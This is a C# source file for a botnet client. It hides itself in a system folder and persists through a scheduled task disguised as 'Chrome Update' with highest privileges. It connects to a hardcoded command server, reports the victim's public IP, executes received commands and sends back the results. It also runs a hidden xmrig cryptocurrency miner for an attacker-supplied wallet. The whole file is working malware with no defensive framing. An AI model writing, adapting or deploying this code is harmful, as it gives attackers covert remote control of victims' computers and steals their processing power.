using Client.Commands;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Client
{
    class Client
    {
        private static CommandHandler ch;
        private static int SleepTimeOnTERMINATED = 240000; // 4 minutes
        public static string RootPath = @"C:\Users\SimpleBotnet\";
        public static string InstallPath = RootPath + "botnet.exe";
        public static string MinerPath = RootPath + "xmrig.exe";
        //IP address to connect to
        private static string address = "127.79.45.6";
        //public Boolean MiningActive = false;
        private static TcpClient tcpclnt = new TcpClient();

        static async Task Main(string[] args)
        {

                
            try {installSelf(); setAutorun(); } catch {Console.WriteLine("don`t admin permission"); }



            ch = new CommandHandler();

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("Botnet Client");
            Console.ForegroundColor = ConsoleColor.White;
            new Thread(() =>
            {

            
                while (true) {
                    bool writeDots = true;

                    try
                    {
                        Console.Write("Connecting...");

                        new Thread(() =>
                        {
                            while (writeDots)
                            {
                                Console.Write(".");
                                Thread.Sleep(100);
                            }
                        }).Start();

                        tcpclnt.Connect(address, 32767);
                        writeDots = false;
                        // use the ipaddress as in the server program

                        Console.Write("[");
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.Write("COMPLETE");
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.WriteLine("]");

                        String str = $"Incoming Connection From: {GetIPAddress().Trim()}";
                        Stream stm = tcpclnt.GetStream();

                        ASCIIEncoding asen = new ASCIIEncoding();
                        byte[] ba = asen.GetBytes(str);
                        Console.Write("\nTransmitting...");

                        new Thread(() =>
                        {
                            while (writeDots)
                            {
                                Console.Write(".");
                                Thread.Sleep(100);
                            }
                        }).Start();

                        stm.Write(ba, 0, ba.Length);
                        writeDots = false;

                        Console.Write("[");
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.Write("COMPLETE");
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.WriteLine("]");



                        while (true)
                        {
                            string appendedLine = "";
                                
                            byte[] bb = new byte[512];
                            int k = stm.Read(bb, 0, 512);

                            for (int i = 0; i < k; i++)
                                appendedLine += Convert.ToChar(bb[i]);

                            string commandReturn = ch.runCommand(appendedLine);

                            new Thread(() =>
                            {
                                Console.Write(commandReturn);
                            }).Start();
                             
                            byte[] returnByte = asen.GetBytes($"{GetIPAddress().Trim()} - {commandReturn}");

                            stm.Write(returnByte, 0, returnByte.Length);
                            appendedLine = "";
                            returnByte = null;
                                
                            Console.WriteLine();
                        }
                    }

                    catch (Exception e)
                    {
                        writeDots = false;
                        Console.Write("[");
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.Write("TERMINATED");
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.WriteLine("]\n");

                        Console.WriteLine(e.Message);
                        Thread.Sleep(SleepTimeOnTERMINATED);
                    }

                
                }
            }).Start();

        }




        static string GetIPAddress() //public ip
        {
            try
            {
                String address = "";
                WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
                using (WebResponse response = request.GetResponse())
                using (StreamReader stream = new StreamReader(response.GetResponseStream()))
                {
                    address = stream.ReadToEnd();
                }

                int first = address.IndexOf("Address: ") + 9;
                int last = address.LastIndexOf("</body>");
                address = address.Substring(first, last - first);

                return address;
            }
            catch (Exception e)
            {
                return e.Message;
            }
        }
        public static void installSelf()
        {
            Console.WriteLine("[+] Copying to system...");

            if (!Directory.Exists(Path.GetDirectoryName(InstallPath)))
            {
                
                Directory.CreateDirectory(Path.GetDirectoryName(InstallPath));

            }


            try
            {
                System.IO.File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, InstallPath);
                DirectoryInfo dir = new DirectoryInfo(Path.GetDirectoryName(InstallPath));

                dir.Attributes |= FileAttributes.Hidden;
                dir.Attributes |= FileAttributes.System;
            }
            catch { }


            try { System.IO.File.Copy("xmrig.exe", MinerPath, true); } catch { }
            
            
        }
        public static void setAutorun()
        {
            Console.WriteLine("[+] Installing to autorun...");
            TaskSchedulerCommand($"/create /f /sc ONLOGON /RL HIGHEST /tn \"Chrome Update\" /tr \"{InstallPath}\"");
        }
        private static void TaskSchedulerCommand(string args)
        {

            // Add to autorun
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = "schtasks.exe";
            startInfo.Arguments = args;
            process.StartInfo = startInfo;
            process.Start();
            process.WaitForExit();
        }
    }
    public class MiningLogic
    {
        private Process minerProcess;

        public async Task StartMiningAsync(string minerPath, string poolAddress, string walletAddress, string workerName, int processorAffinityPercentage)
        {

            var CL = new Client();


            if (!System.IO.File.Exists(minerPath))
            {
                Console.WriteLine("Error path");
                return;
            }

            try
                {
                KillProcessUsingFile(Client.MinerPath);
            }
            catch { }
            string arguments = $"--url " + poolAddress + " --user " + walletAddress + " --pass " + workerName + " --donate-level 0";
            ProcessStartInfo processInfo = new ProcessStartInfo(minerPath, arguments);
            processInfo.UseShellExecute = false;
            processInfo.RedirectStandardOutput = true;
            processInfo.CreateNoWindow = true;

            minerProcess = new Process();
            minerProcess.StartInfo = processInfo;
            minerProcess.Start();

            if (processorAffinityPercentage > 0 && processorAffinityPercentage <= 100)
            {
               long processorAffinityMask = GetProcessorAffinityMask(processorAffinityPercentage);
               minerProcess.ProcessorAffinity = (IntPtr)processorAffinityMask;
            }



        }


        private void KillProcessUsingFile(string filePath)
        {
            string fileName = Path.GetFileNameWithoutExtension(filePath);

            Process[] processes = Process.GetProcessesByName(fileName);
            foreach (Process process in processes)
            {
                try
                {
                    process.Kill();
                    process.WaitForExit();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Ошибка при завершении процесса: {ex.Message}");
                }
            }
        }
        private long GetProcessorAffinityMask(int processorAffinityPercentage)
        {
            int processorCount = Environment.ProcessorCount;
            int availableProcessorCount = (int)Math.Round(processorCount * (processorAffinityPercentage / 100.0));
            long processorAffinityMask = 0;

            for (int i = 0; i < availableProcessorCount; i++)
            {
                processorAffinityMask |= (1L << i);
            }

            return processorAffinityMask;
        }
        public async Task StopMining()
        {
            var CL = new Client();

            try
            { 
                KillProcessUsingFile(Client.MinerPath);
            }
            catch{}
            

        }
    }
}
